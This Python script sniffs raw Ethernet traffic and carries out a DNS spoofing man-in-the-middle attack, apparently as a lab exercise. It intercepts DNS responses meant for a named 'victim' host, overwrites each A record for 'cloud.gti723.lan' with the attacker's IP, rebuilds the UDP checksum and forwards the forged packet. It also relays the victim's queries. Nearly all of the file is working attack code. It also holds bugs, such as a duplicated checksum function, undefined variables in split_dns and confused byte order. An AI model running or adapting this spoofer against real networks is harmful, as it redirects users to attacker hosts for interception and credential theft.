import socket
import struct

# ==================  Helper Functions ================== #

def big_endian_to_int(data):
    res = 0
    for byte in data[::-1]:
        res = res << 8 | ord(byte)

    return res

def little_endian_to_int(data):
    res = 0
    for byte in data:
        res = res << 8 | ord(byte)

    return res

def bytes_to_mac(bytes_addr):
    bytes_str = map('{:02x}'.format, [ord(b) for b in bytes_addr])
    return ':'.join(bytes_str).upper()



def bytes_to_ipv4(addr):
    return '.'.join(map(lambda e : str(255 & ord(e)), addr))


def pseudo_header(src_ip, dest_ip, proto, length):
    return src_ip + dest_ip + '\x00' + proto + struct.pack('!H', length)


def calculate_udp_checksum(pseudo_header, udp_datagram):
    # Concatenate pseudo-header and UDP datagram
    pseudo_and_udp = pseudo_header + udp_datagram

    # Make the total length even
    if len(pseudo_and_udp) % 2 != 0:
        pseudo_and_udp += '\x00'

    # Divide into 16-bit words
    words = struct.unpack("!%dH" % (len(pseudo_and_udp) / 2), pseudo_and_udp)

    # Calculate one's complement sum
    checksum_sum = sum(words)

    # Take one's complement of the sum
    checksum = (checksum_sum & 0xFFFF) + (checksum_sum >> 16)
    checksum = ~checksum & 0xFFFF

    return checksum



def create_udp_pseudo_header(source_ip, dest_ip, udp_length):
    # Convert IP addresses to 32-bit packed binary format
    source_ip_packed = socket.inet_aton(source_ip)
    dest_ip_packed = socket.inet_aton(dest_ip)

    # Pseudo-header fields
    zero_field = '\x00'
    protocol_field = '\x11'  # Protocol field for UDP is 17 in decimal

    udp_length = struct.pack('!H', udp_length)

    # Concatenate the fields to create the pseudo-header
    pseudo_header = source_ip_packed + dest_ip_packed + zero_field + protocol_field + udp_length

    return pseudo_header

def create_udp_datagram(source_port, dest_port, length, data):
    source_port = struct.pack('!H', source_port)
    dest_port = struct.pack('!H', dest_port)
    length = struct.pack('!H', length)

    return source_port + dest_port + length + '\x00\x00' + data

def calculate_udp_checksum(pseudo_header, udp_datagram):
    # Concatenate pseudo-header and UDP datagram
    pseudo_and_udp = pseudo_header + udp_datagram

    # Make the total length even
    if len(pseudo_and_udp) % 2 != 0:
        pseudo_and_udp += '\x00'

    # Divide into 16-bit words
    words = struct.unpack("!%dH" % (len(pseudo_and_udp) / 2), pseudo_and_udp)

    # Calculate one's complement sum
    checksum_sum = sum(words)

    # Take one's complement of the sum
    checksum = (checksum_sum & 0xFFFF) + (checksum_sum >> 16)
    checksum = ~checksum & 0xFFFF

    return checksum

## ==================  Parse Packets ================== ##


def ethernet_packet(data):
    dest_mac = data[:6]
    src_mac = data[6:12]

    proto = big_endian_to_int(data[12:14])

    return bytes_to_mac(dest_mac), bytes_to_mac(src_mac), proto, data[14:], data[14:]


def ipv4_packet(data): 
    if not data:
        return 0,0,0,0,0,0,0,0

    version = ord(data[0]) >> 4
    header_length = ord(data[0]) & 0xF

    total_length = ord(data[3]) << 8 | ord(data[2])

    ttl = ord(data[8])
    proto = ord(data[9])
    
    src = data[12:16]
    target = data[16:20]    

    return version, header_length, ttl, proto, bytes_to_ipv4(src), bytes_to_ipv4(target), data[header_length * 4:], data[:header_length * 4]


def udp_packet(data):
    src_port    = ord(data[0]) << 8 | ord(data[1])
    dest_port   = ord(data[2]) << 8 | ord(data[3])
    length      = ord(data[4]) << 8 | ord(data[5])
    checksum    = data[6:8]
    return src_port, dest_port, length, checksum, data[8:], data[:8]


def dns_extract_name(data, offset):
    name = ''
    length = ord(data[offset])    
    while length != 0:
        name += data[offset + 1: offset + 1 + length] + '.'
        offset += length + 1
        length = ord(data[offset])

    name = name[:-1]
    return name, offset + 1, 


def dns_extract_queries(data, questions):
    queries = []
    inital_offset = 12
    for _ in range(questions):

        # extract query name
        # just trust the algorithm, it just works
        name, offset = dns_extract_name(data, 0)
        
        data = data[offset:]
        queries.append({
            'name': name,
            'type': data[:2],
            'class': data[2:4],
            'start_offset': inital_offset
        })
        data = data[4:]
        inital_offset += offset + 4

    return queries, data



def dns_extract_answers(data, answers, dns_packet):

    answer = []
    initial_offset = len(dns_packet) - len(data)
    for _ in range(answers):
        offset  = little_endian_to_int(data[:2]) & 0x3FFF
        type    = little_endian_to_int(data[2:4])
        class_  = little_endian_to_int(data[4:6])
        ttl     = little_endian_to_int(data[6:10])
        length  = little_endian_to_int(data[10:12])
        rdata   = data[12:length]

        answer.append({
            'name': dns_extract_name(dns_packet, offset)[0],
            'type': type,
            'class': class_,
            'ttl': ttl,
            'length': length,
            'rdata': rdata,
            'start_offset': initial_offset 
        })        

        data = data[12 + length:]
        initial_offset += 12 + length
        

    return answer, data



def dns_packet(data):
    # DNS
    transaction_id  = little_endian_to_int(data[:2])
    flags           = data[2:4]
    questions       = little_endian_to_int(data[4:6])
    answer_rrs      = little_endian_to_int(data[6:8])
    authority_rrs   = little_endian_to_int(data[8:10])
    additional_rrs  = little_endian_to_int(data[10:12])
    rdata           = data[12:]

    queries, rdata = dns_extract_queries(rdata, questions)
    answers, rdata = dns_extract_answers(rdata, answer_rrs, data)

    return transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs, queries, answers, rdata


def split_dns(data):
    # DNS
    header  = data[:12]
    qdata   = data[12:]

    _, adata = dns_extract_queries(qdata, questions)
    _, rdata = dns_extract_answers(adata, answer_rrs, data)

    qdata = qdata[:len(qdata) - len(adata)]
    adata = adata[:len(adata) - len(rdata)]

    return header, qdata, adata, rdata

## ==================  Create Ethernet Packet ================== ##

def ipv4_to_bytesString(ip):
    return ''.join(map(chr, map(int, ip.split('.'))))

def mac_to_bytesString(mac):
    return mac.replace(':', '').decode('hex')

def create_ethernet_packet(dest_mac, src_mac, proto, data):
    dest_mac = mac_to_bytesString(dest_mac)
    src_mac = mac_to_bytesString(src_mac)
    proto = ('%04x' % proto).decode('hex')[::-1]

    return dest_mac + src_mac + proto + data


def create_udp_packet(source_port, dest_port, length, checksum):
    source_port = struct.pack('!H', source_port)
    dest_port = struct.pack('!H', dest_port)
    length = struct.pack('!H', length)
    checksum = struct.pack('!H', checksum)

    return source_port + dest_port + length + checksum


def raw_to_hexstr(str):
    return "\\x" + "\\x".join("{:02x}".format(ord(c)) for c in str)


dns_server_mac = "08:00:27:8a:94:ba"
client_mac = "08:00:27:a0:62:d5"

ip_victime = "192.168.50.44"
ip_dns = "192.168.50.5"



# ==================  Sniffer ================== #
print('Sniffer started')
# create raw socket
s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0003))
#s.bind(('eth0', 0))

#get local ip
local_ip = "192.168.50.25"

while True:
    data = s.recvfrom(65535)
    

    dest_mac, src_mac, proto, data_ip, capsule_ethernet = ethernet_packet(data[0])
    # print('Ethernet Frame:')
    # print('Destination: {}, Source: {}, Protocol: {}'.format(dest_mac, src_mac, proto))

    if proto == 8: # IPv4
        version, header_length, ttl, proto_ip, src_ip, target_ip, data_transport, capsule_ip = ipv4_packet(data_ip)
        # print('IPv4 Packet:')
        # print('Version: {}, Header Length: {}, TTL: {}'.format(version, header_length, ttl))
        # print('Protocol: {}, Source: {}, Target: {}'.format(proto_ip, src_ip, target_ip))

        if proto_ip == 17: # UDP

            src_port, dest_port, length, checksum, data_app, capsule_transport = udp_packet(data_transport)
            # print('UDP Segment:')
            # print('Source Port: {}, Destination Port: {}, Length: {}, Checksum: {}'.format(src_port, dest_port, length, checksum))

            if src_port == 53: # DNS response

                # filtre by ip
                if src_ip != ip_dns or target_ip != ip_victime :        
                    continue

                # gather dns data
                transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs, queries, answers, rdata = dns_packet(data_app)

                # check if the DNS response is for the victim
                if not any(query['name'] == "cloud.gti723.lan" for query in queries):
                    continue


                print('DNS Packet:')
                print('Transaction ID: {}, Flags: {}, Questions: {}, Answer RRs: {}, Authority RRs: {}, Additional RRs: {}'.format(transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs))
                for query in queries:
                    print('Query: {}, Type: {}, Class: {}, start_offset: {}'.format(query['name'], query['type'], query['class'], query['start_offset']))

                for answer in answers:
                    print('Name: {}, Type: {}, Class: {}, TTL: {}, Length: {}, RData: {}, start_offset: {}'.format(answer['name'], answer['type'], answer['class'], answer['ttl'], answer['length'], raw_to_hexstr(answer['rdata']), answer['start_offset']))


                # modify the DNS response
                # modify the IP address in the DNS response

                for answer in answers:
                    if answer['type'] == 1:
                        i = 0
                        data_app = bytearray(data_app)
                        for octet in ipv4_to_bytesString(local_ip):    
                            data_app[answer['start_offset'] + 12 + i] = octet
                            i += 1
                        data_app = bytes(data_app)

                # forward the DNS response to the client
                # modify mac addresses
                src_mac = dest_mac
                dest_mac = client_mac

                # repackage the packet
                tpacket = create_ethernet_packet(dest_mac, src_mac, proto, data_ip) 
                packet = create_ethernet_packet(dest_mac, src_mac, proto, capsule_ip + create_udp_packet(src_port, dest_port, length, calculate_udp_checksum(create_udp_pseudo_header(src_ip , target_ip, length), create_udp_datagram(src_port, dest_port, length, data_app  ))))

                print(raw_to_hexstr(packet))
                print("\n===========\n")
                print(raw_to_hexstr(tpacket))
                # send the packet
                s.sendto(packet, ('eth0', 0))

                print('Forwarding MODIFIED packet to {}'.format(target_ip))
                data = None
                
                
            if dest_port == 53: # DNS request


                # check if it's coming from the victim and going to the DNS server
                if src_ip != ip_victime or target_ip != ip_dns :
                    continue

                # parse the DNS request
                transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs, queries, answers, rdata = dns_packet(data_app)

                 # check if the DNS response is for the victim
                if not any(query['name'] == "cloud.gti723.lan" for query in queries):
                    continue

                print('DNS Packet:')
                print('Transaction ID: {}, Flags: {}, Questions: {}, Answer RRs: {}, Authority RRs: {}, Additional RRs: {}'.format(transaction_id, flags, questions, answer_rrs, authority_rrs, additional_rrs))
                for query in queries:
                    print('Query: {}, Type: {}, Class: {}, start_offset: {}'.format(query['name'], query['type'], query['class'], query['start_offset']))

                for answer in answers:
                    print('Name: {}, Type: {}, Class: {}, TTL: {}, Length: {}, RData: {}, start_offset: {}'.format(answer['name'], answer['type'], answer['class'], answer['ttl'], answer['length'], raw_to_hexstr(answer['rdata']), answer['start_offset']))


                # forward the DNS request to the destination
                # modify mac addresses
                src_mac = dest_mac
                dest_mac = dns_server_mac

                # repackage the packet
                packet = create_ethernet_packet(dest_mac, src_mac, proto, data_ip)

                # send the packet
                s.sendto(packet, ('eth0', 0))

                print('Forwarding packet to {}'.format(target_ip))
                data = None
                
